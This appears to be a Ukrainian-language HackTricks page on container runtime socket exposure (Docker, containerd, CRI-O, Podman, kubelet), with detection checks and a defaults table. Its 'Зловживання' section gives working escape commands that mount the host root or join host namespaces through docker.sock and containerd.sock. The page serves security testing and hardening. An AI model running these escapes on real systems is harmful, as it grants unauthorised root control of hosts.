# Runtime API та експозиція демона

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Багато реальних компрометацій контейнерів зовсім не починаються з namespace escape. Вони починаються з доступу до контрольної площини runtime. Якщо робоче навантаження може спілкуватися з `dockerd`, `containerd`, CRI-O, Podman або kubelet через змонтований Unix socket або відкритий TCP-лістенер, нападник може запросити новий контейнер з вищими привілеями, змонтувати файлову систему хоста, приєднатися до namespace хоста або отримати конфіденційну інформацію вузла. У таких випадках runtime API є реальним кордоном безпеки, і його компрометація фактично близька до компрометації хоста.

Це пояснює, чому експозиція runtime socket повинна документуватися окремо від захистів ядра. Контейнер з звичайними seccomp, capabilities і MAC confinement може все ще бути в один виклик API від компрометації хоста, якщо всередину змонтовано `/var/run/docker.sock` або `/run/containerd/containerd.sock`. Ізоляція ядра поточного контейнера може працювати точно так, як задумано, поки plane управління runtime залишається повністю відкритим.

## Моделі доступу до демона

Docker Engine традиційно надає свій привілейований API через локальний Unix socket за адресою `unix:///var/run/docker.sock`. Історично він також міг бути відкритий віддалено через TCP-лістенери, такі як `tcp://0.0.0.0:2375`, або через TLS-захищений слухач на `2376`. Експозиція демона віддалено без сильного TLS і автентифікації клієнта фактично перетворює Docker API на інтерфейс віддаленого root.

containerd, CRI-O, Podman і kubelet відкривають подібні поверхні з високим ступенем впливу. Назви та робочі процеси можуть відрізнятися, але логіка та сама. Якщо інтерфейс дозволяє виклику створювати workloads, монтувати host paths, отримувати credentials або змінювати запущені контейнери, цей інтерфейс є привілейованим каналом управління і повинен розглядатися відповідно.

Звичайні локальні шляхи, які варто перевірити є:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Старіші або більш спеціалізовані стекі також можуть виставляти кінцеві точки, такі як `dockershim.sock`, `frakti.sock` або `rktlet.sock`. Вони менш розповсюджені в сучасних середовищах, але при їх виявленні слід ставитися до них з такою ж обережністю, оскільки вони представляють собою інтерфейси керування середовищем виконання, а не звичайні сокети додатків.

## Захищений віддалений доступ

Якщо демон має бути доступний поза локальним сокетом, з'єднання потрібно захищати за допомогою TLS і, бажано, з взаємною автентифікацією, щоб демон перевіряв клієнта, а клієнт — демон. Звичка відкривати Docker daemon через звичайний HTTP для зручності — одна з найнебезпечніших помилок в адмініструванні контейнерів, оскільки поверхня API достатньо потужна, щоб напряму створювати привілейовані контейнери.

Історичний шаблон конфігурації Docker виглядав так:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
На хостах на базі systemd комунікація daemon також може відображатися як `fd://`, що означає, що процес успадковує попередньо відкритий socket від systemd, замість того щоб прив'язувати його самостійно. Головний висновок — не точний синтаксис, а наслідок для безпеки. У момент, коли daemon слухає поза межами суворо захищеного local socket, захист транспортного рівня та автентифікація клієнта стають обов'язковими, а не опційними заходами жорсткого захисту.

## Зловживання

Якщо присутній runtime socket, підтвердіть, який саме це socket, чи існує сумісний клієнт, і чи можливий доступ через raw HTTP або gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Ці команди корисні, оскільки дозволяють відрізнити мертвий шлях, змонтований але недоступний socket, та активний привілейований API. Якщо клієнт успішний, наступне питання — чи може API запустити новий контейнер з host bind mount або host namespace sharing.

### Повний приклад: Docker Socket To Host Root

Якщо `docker.sock` доступний, класичний спосіб ескейпу — запустити новий контейнер, який змонтує кореневу файлову систему хоста й потім виконати в ньому `chroot`:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Це дає можливість виконувати команди безпосередньо від імені root на хості через Docker daemon. Наслідки не обмежуються лише читанням файлів. Потрапивши в новий контейнер, нападник може змінювати файли на хості, збирати облікові дані, закріплювати персистентність або запускати додаткові привілейовані робочі навантаження.

### Повний приклад: Docker Socket To Host Namespaces

Якщо нападник віддає перевагу входу в namespace замість доступу лише до файлової системи:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Цей шлях досягає хоста, просячи runtime створити новий container з явним наданням доступу до host-namespace, а не шляхом експлуатації поточного.

### Повний приклад: containerd Socket

Змонтований `containerd` socket зазвичай так само небезпечний:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Наслідком знову є компрометація хоста. Навіть якщо Docker-specific tooling відсутнє, інший runtime API все одно може надати ті самі адміністративні повноваження.

## Перевірки

Метою цих перевірок є з'ясувати, чи може контейнер досягти будь-якої площини управління, яка мала б залишатися поза кордоном довіри.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Цікаво, що:

- Маунтований runtime-сокет зазвичай є прямим адміністративним примітивом, а не просто розкриттям інформації.
- TCP-слухач на `2375` без TLS слід вважати умовою віддаленої компрометації.
- Змінні середовища, такі як `DOCKER_HOST`, часто вказують, що робоче навантаження було навмисно спроєктоване для взаємодії з рантаймом хоста.

## Налаштування рантайму за замовчуванням

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Локальний Unix-сокет за замовчуванням | `dockerd` слухає локальний сокет, і демон зазвичай працює з root-привілеями | маунт `/var/run/docker.sock`, експонування `tcp://...:2375`, слабкий або відсутній TLS на `2376` |
| Podman | CLI без демона за замовчуванням | Для звичайного локального використання не потрібен довгоживучий привілейований демон; API-сокети можуть бути відкриті, коли увімкнено `podman system service` | експонування `podman.sock`, запуск сервісу з широким доступом, використання API з правами root |
| containerd | Локальний привілейований сокет | Адміністративний API доступний через локальний сокет і зазвичай використовується інструментами вищого рівня | маунт `containerd.sock`, широкий доступ `ctr` або `nerdctl`, експонування привілейованих просторів імен |
| CRI-O | Локальний привілейований сокет | CRI endpoint призначений для довірених компонент, локальних для вузла | маунт `crio.sock`, експонування CRI endpoint до недовірених робочих навантажень |
| Kubernetes kubelet | Node-local management API | Kubelet не повинен бути загальнодоступним з Pods; доступ може розкрити стан Pods, облікові дані та можливості виконання залежно від authn/authz | маунт kubelet-сокетів або сертифікатів, слабка аутентифікація kubelet, хост-мережа плюс доступна кінцева точка kubelet |
